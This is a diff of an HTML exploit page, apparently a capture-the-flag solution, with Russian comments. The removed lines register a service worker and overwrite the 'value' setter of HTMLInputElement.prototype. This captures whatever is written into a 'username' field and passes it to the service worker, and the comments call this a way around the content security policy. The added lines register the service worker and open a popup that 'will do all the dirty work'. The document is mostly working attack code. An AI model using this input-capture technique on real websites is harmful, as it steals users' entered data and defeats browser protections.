@@ -1,49 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit Loader</title>
+    <title>Exploit Entrypoint</title>
 </head>
 <body>
-    <h1>Service Worker is being registered... Exploit is armed.</h1>
+    <h1>Registering Service Worker and opening popup...</h1>
     <script>
-        // Регистрируем Service Worker. Он должен лежать в том же каталоге.
+        // Регистрируем Service Worker
         navigator.serviceWorker.register('sw.js').then(reg => {
-            console.log('Service worker registration successful:', reg);
-
-            // Ждем, пока SW будет готов к приему сообщений
-            navigator.serviceWorker.ready.then(() => {
-                console.log('Service worker is active. Poisoning HTMLInputElement prototype...');
-                
-                // Сохраняем оригинальное поведение свойства 'value'
-                const originalDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
-
-                // Переопределяем свойство 'value'
-                Object.defineProperty(HTMLInputElement.prototype, 'value', {
-                    // Создаем свой сеттер, который сработает при попытке записи в <input>
-                    set: function(value) {
-                        // Нас интересует только поле 'username', и мы должны быть уверены, что SW активен
-                        if (this.name === 'username' && navigator.serviceWorker.controller) {
-                            console.log(`[EXPLOIT] FLAG CAPTURED: ${value}`);
-                            
-                            // Отправляем флаг в Service Worker, обходя CSP!
-                            navigator.serviceWorker.controller.postMessage(value);
-                        }
-                        
-                        // Вызываем оригинальный сеттер, чтобы не нарушать работу страницы
-                        originalDescriptor.set.apply(this, arguments);
-                    },
-                    // Возвращаем оригинальный геттер
-                    get: function() {
-                        return originalDescriptor.get.apply(this, arguments);
-                    }
-                });
-
-                console.log('Prototype is poisoned. Waiting for the bot...');
-            });
-
-        }).catch(err => {
-            console.error('Service worker registration failed: ', err);
-        });
+            console.log('Service Worker registered successfully');
+            // Открываем popup, который сделает всю грязную работу
+            window.open('popup.html');
+        }).catch(err => console.error('Service Worker registration failed: ', err));
     </script>
 </body>
 </html>
